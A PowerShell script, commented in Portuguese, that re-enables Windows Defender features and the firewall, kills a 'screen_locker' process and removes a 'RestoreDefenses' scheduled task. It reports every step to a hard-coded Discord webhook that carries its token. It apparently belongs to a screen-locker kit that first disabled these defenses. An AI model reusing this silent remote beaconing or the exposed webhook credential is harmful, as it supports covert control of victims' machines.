# ---------- Função para enviar notificação ao Discord ----------
function Send-DiscordWebhook {
    param([string]$Message)
    $webhookUrl = "https://discord.com/api/webhooks/1527718727204999299/nVc21-8bK1MfgI1Ybw5hZYG3KU0xuEZZalMATPdxY-jJFizPZn_sZiObl0UEUaGRRMdA"
    $payload = @{ content = $Message } | ConvertTo-Json
    try {
        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json" -ErrorAction Stop | Out-Null
    } catch { }
}

# ---------- Etapa 1/6: Reativar BlockAtFirstSeen ----------
Send-DiscordWebhook "🛡️ Reativando proteção contra bloqueio à primeira vista (1/6)"
Set-MpPreference -DisableBlockAtFirstSeen $false -ErrorAction SilentlyContinue

# ---------- Etapa 2/6: Reativar IOAV ----------
Send-DiscordWebhook "🛡️ Reativando proteção IOAV (2/6)"
Set-MpPreference -DisableIOAVProtection $false -ErrorAction SilentlyContinue

# ---------- Etapa 3/6: Reativar escaneamento de scripts ----------
Send-DiscordWebhook "🛡️ Reativando escaneamento de scripts (3/6)"
Set-MpPreference -DisableScriptScanning $false -ErrorAction SilentlyContinue

# ---------- Etapa 4/6: Restaurar envio de amostras ----------
Send-DiscordWebhook "🛡️ Restaurando envio automático de amostras (4/6)"
Set-MpPreference -SubmitSamplesConsent 1 -ErrorAction SilentlyContinue

# ---------- Etapa 5/6: Restaurar MAPS ----------
Send-DiscordWebhook "🛡️ Restaurando MAPS (5/6)"
Set-MpPreference -MAPSReporting 2 -ErrorAction SilentlyContinue

# ---------- Etapa 6/6: Firewall + matar locker + limpeza ----------
Send-DiscordWebhook "🔥 Reativando Firewall e finalizando limpeza (6/6)"
netsh advfirewall set allprofiles state on

# Handshake: matar o locker e remover marcador
$handshakeFile = "$env:TEMP\handshake_restore.txt"
if (Test-Path $handshakeFile) {
    Get-Process -Name "screen_locker" -ErrorAction SilentlyContinue | Stop-Process -Force
    Remove-Item -Path $handshakeFile -Force
}

# Remover tarefa agendada (se ainda existir)
Unregister-ScheduledTask -TaskName "RestoreDefenses" -Confirm:$false -ErrorAction SilentlyContinue
